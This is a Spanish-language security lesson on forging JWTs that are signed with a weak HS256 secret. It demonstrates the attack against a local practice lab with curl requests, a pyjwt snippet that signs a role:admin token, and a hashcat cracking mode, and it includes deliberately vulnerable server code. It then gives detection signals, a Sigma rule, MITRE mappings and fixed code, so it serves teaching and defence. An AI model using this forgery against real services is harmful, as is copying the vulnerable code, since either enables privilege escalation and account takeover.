# 🔐 JWT — Secreto Débil / Forja de Claims

> **La idea:** si el token está firmado con HS256 y un secreto adivinable, cualquiera puede fabricar un token con `role: admin` y entrar como administrador.

---

> ⚖️ **Marco de práctica.** Esta técnica se muestra **solo para objetivos autorizados** (tu propio lab, programas de bug bounty con permiso explícito, entornos de CTF). Todo lo de abajo se ejecuta contra el **lab local `vulnlab.py`** de la comunidad, escuchando en `http://127.0.0.1:5000`. Nunca contra sistemas de terceros.

---

## 1. Qué es y por qué importa

Un **JWT** (JSON Web Token) es una credencial que el servidor emite al hacer login. Tiene tres partes separadas por puntos: `header.payload.firma`. El *payload* lleva "claims" (afirmaciones) como quién sos y qué rol tenés, en JSON codificado en Base64. La **firma** es lo único que impide que edites esos claims a tu gusto.

Con el algoritmo **HS256**, esa firma se calcula con un **secreto simétrico**: la MISMA clave que firma es la que verifica. Si ese secreto es débil (corto, un diccionario, `s3cr3t`...), un atacante lo **crackea offline** y entonces puede firmar **cualquier claim que quiera**. El servidor no distingue un token que firmó él de uno que firmó el atacante: la matemática cierra igual.

**Impacto:** escalada de privilegios total y suplantación de identidad. Fabricar `{"role":"admin"}` y firmarlo convierte a un usuario cualquiera en administrador. No hace falta explotar una memoria ni una inyección: alcanza con conocer (o crackear) el secreto. Es una de las causas más comunes de *account takeover* en APIs.

---

## 2. Montar el lab

Instalá las dependencias y levantá el lab de la comunidad:

```bash
pip install flask requests lxml pyjwt && python3 vulnlab.py
```

El servidor queda escuchando en `http://127.0.0.1:5000`.

**Endpoints de esta clase:**

| Método | Ruta | Qué hace |
|--------|------|----------|
| `POST` | `/login` | Autentica y emite un **JWT HS256** firmado con el secreto débil `s3cr3t`. Devuelve un token con `role: user`. |
| `GET`  | `/admin` | Zona protegida. **Confía en el claim `role`** del token para autorizar. |

---

## 3. El ataque, paso a paso

### Paso 1 — Con un token legítimo, `/admin` te rechaza

El login te da un token con `role: user`. Al usarlo contra `/admin`, no sos admin:

```bash
curl -s http://127.0.0.1:5000/admin -H "Authorization: Bearer <TOKEN_LEGITIMO>"
```

**Output real:**

```
Sos 'user', no admin.
```

### Paso 2 — Forjar un token con `role: admin` firmado con el secreto débil

Como el secreto es `s3cr3t` (6 bytes, trivial de crackear con `hashcat -m 16500`), lo usamos para firmar un token con el claim que queramos. Generamos el token forjado:

```python
import jwt
jwt.encode({'user': 'juan', 'role': 'admin'}, 's3cr3t', 'HS256')
```

### Paso 3 — Usar el token forjado contra `/admin`

```bash
curl -s http://127.0.0.1:5000/admin -H "Authorization: Bearer <TOKEN_FORJADO>"
```

**Output real:**

```
Bienvenido admin! FLAG{jwt_forjado_role_admin}
```

Sin tocar la base de datos ni el servidor: solo cambiamos un claim y firmamos con el secreto correcto.

### Por qué funciona

Hay **dos fallas encadenadas**, y las dos son reutilizables:

**(a) El secreto simétrico es débil.** HS256 firma y verifica con la misma clave. Si esa clave es corta o predecible, se crackea offline (fuerza bruta / diccionario) y a partir de ahí el atacante puede firmar tokens **indistinguibles** de los legítimos.

```python
# Código vulnerable (emisión):
token = jwt.encode({'user': u, 'role': 'user'}, 's3cr3t', algorithm='HS256')
#                                                ^^^^^^^^ secreto de 6 bytes → crackeable
```

**(b) El servidor confía en un claim controlado por el cliente para autorizar.** Aunque el secreto fuera fuerte, autorizar leyendo `role` del token es frágil: el rol de un usuario es un dato del **servidor**, no algo que el cliente deba declarar.

```python
# Código vulnerable (autorización):
data = jwt.decode(token, 's3cr3t', algorithms=['HS256'])
if data['role'] == 'admin':          # confía en el claim del cliente
    return "Bienvenido admin! FLAG{...}"
```

**Concepto reusable:** *la firma solo prueba integridad, no autoridad*. Si el atacante controla la clave de firma, controla los claims. Y la autorización nunca debe derivarse de datos que el cliente puede fabricar.

---

## 4. Blue Team

### Firma de detección

- **Picos de `alg: none`** o cambios de algoritmo (RS→HS) en headers de JWT: intentos de bypass de firma.
- **Tokens con firma inválida** llegando repetidamente (alguien probando secretos o payloads editados).
- **Un mismo usuario presentando roles distintos** en ventanas cortas (`user` y `admin`), señal de manipulación de claims.
- Acceso exitoso a `/admin` desde una cuenta cuyo rol en la base de datos es `user`.

### Regla Sigma

```yaml
title: Posible forja de JWT / manipulacion de claims
id: 8f2a4c1d-6b3e-4d7a-9c2f-1e5b8a3d0f47
status: experimental
description: Detecta bypass de firma JWT (alg none) o roles inconsistentes en accesos a rutas admin
logsource:
  category: application
  product: webapp
detection:
  alg_none:
    # jwt_header ya viene decodificado por el pipeline de logs.
    # OJO: este lab firma legitimamente con HS256, por eso NO se flaguea HS256.
    # En un emisor que usa RS256 como baseline, agregar aqui '"alg":"HS256"'
    # para cazar confusion de algoritmo RS->HS.
    jwt_header|contains:
      - '"alg":"none"'
      - '"alg":"None"'
      - '"alg":"NONE"'
  admin_access:
    uri_path: '/admin'
    auth_result: 'success'
  role_mismatch:
    token_role: 'admin'
    db_role: 'user'
  condition: alg_none or (admin_access and role_mismatch)
fields:
  - src_ip
  - user
  - token_role
  - db_role
  - jwt_header
falsepositives:
  - Migraciones legitimas de algoritmo de firma
  - Cuentas con rol recien elevado y cache de rol desactualizado
level: high
```

### Mapeo MITRE ATT&CK

| Técnica | ID | Relación con el ataque |
|---------|-----|------------------------|
| Forge Web Credentials | **T1606** | El atacante fabrica y firma un JWT válido con claims a medida (`role: admin`): forja directa de la credencial web. Es la técnica más precisa para este ataque. |
| Unsecured Credentials | **T1552** | El secreto de firma débil es una credencial mal protegida que se crackea offline. |
| Valid Accounts | **T1078** | El token forjado se presenta como una sesión válida, dando acceso legítimo aparente con privilegios elevados. |

### Mitigación (el fix en código)

| Problema | Fix correcto |
|----------|--------------|
| Secreto simétrico débil (`s3cr3t`) | Usar un secreto **aleatorio de ≥32 bytes** (256 bits), gestionado fuera del código. |
| HS256 con secreto compartido | Preferir **RS256/ES256** (clave privada firma, pública verifica); proteger la privada. |
| Aceptar cualquier `alg` | **Fijar el algoritmo esperado** y rechazar `none` y confusión RS/HS. |
| Autorizar por claim del cliente | **No confiar en `role` del token**: validar el rol **server-side** contra la fuente de verdad. |

```python
import jwt, os

# 1) Secreto fuerte, cargado del entorno (no hardcodeado):
SECRET = os.environ["JWT_SECRET"]          # p.ej. generado con secrets.token_urlsafe(32)

# 2) Verificacion que fija el algoritmo (rechaza 'none' y RS/HS confusion):
try:
    data = jwt.decode(token, SECRET, algorithms=["HS256"])
except jwt.InvalidTokenError:
    return "Token invalido", 401

# 3) Autorizacion server-side: el rol viene de la BD, NO del token:
user = db.get_user(data["user"])
if user and user.role == "admin":
    return "Bienvenido admin!"
return "No autorizado", 403
```

---

## 5. Q&A de entrevista

**1) ¿Por qué un secreto HS256 débil es tan grave si la firma "protege" el token?**
Porque en HS256 la clave que firma es la misma que verifica. La firma solo garantiza integridad *si el secreto es privado*. Un secreto débil se crackea offline (por ejemplo con `hashcat -m 16500`), y con él el atacante firma tokens con cualquier claim, indistinguibles de los legítimos. La firma deja de ser una barrera.

**2) ¿Qué es el ataque de confusión de algoritmos (RS/HS) y cómo se relaciona?**
Si el servidor usa RS256 (clave pública para verificar, privada para firmar) pero acepta el `alg` que declara el token, un atacante puede cambiarlo a HS256 y firmar usando la **clave pública** (que es conocida) como si fuera el secreto HMAC. Por eso hay que **fijar el algoritmo esperado** en la verificación y nunca dejar que el token elija.

**3) Aunque el secreto fuera fuerte, ¿por qué sigue siendo un error autorizar por el claim `role`?**
Porque la autoridad de un usuario es un dato del servidor, no una afirmación del cliente. El diseño correcto trata el token como prueba de *identidad* y consulta el rol en la fuente de verdad (BD/servicio). Así, aunque un claim se manipule, la decisión de autorización no depende de él.

**4) Como defensor, ¿qué señales delatan este ataque en los logs?**
Tokens con firma inválida repetidos, headers con `alg: none` o cambios de algoritmo, un mismo usuario presentando roles distintos en poco tiempo, y accesos exitosos a rutas admin desde cuentas cuyo rol real es `user`. Se cubren con una regla que correlaciona el rol del token contra el rol persistido. En términos ATT&CK, esto cae en Forge Web Credentials (T1606) apoyado por un secreto mal protegido (T1552).